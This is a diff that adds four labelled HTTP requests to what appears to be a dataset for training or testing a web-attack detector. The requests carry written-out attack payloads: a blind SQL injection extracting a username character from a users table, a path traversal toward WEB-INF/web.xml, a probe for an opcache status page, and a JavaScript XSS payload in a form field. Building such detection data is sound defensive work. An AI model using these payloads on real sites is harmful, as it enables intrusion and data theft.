@@ -1,0 +1,4 @@
+{"method": "GET", "url": "tienda1/AND%20ASCII%28SUBSTRING%28SELECT%20TOP%201%20username%20FROM%20tblusers%29%2C1%2C1%29%3D97", "body": "", "label": 1, "location": ["<Path>AND%20ASCII%28SUBSTRING%28SELECT%20TOP%201%20username%20FROM%20tblusers%29%2C1%2C1%29%3D97"]}
+{"method": "GET", "url": "tienda1/opcache-status/opcache.php", "body": "", "label": 2, "location": ["<Path>opcache-status/opcache.php"]}
+{"method": "GET", "url": "tienda1/../../WEB-INF/./////.////.///.//./web.xml", "body": "", "label": 3, "location": ["<Path>../../WEB-INF/./././././web.xml"]}
+{"method": "GET", "url": "tienda1/publico/autenticar.jsp?modo=registro&login=gottscha&pwd=rutilant%2Be&remember=%3CA%20HrEF%3Djavascript%3Aprompt(904701609)%3E&B1=A%F1adir+al+carrito", "body": "", "label": 4, "location": ["<ModifiedURLkey>remember"]}
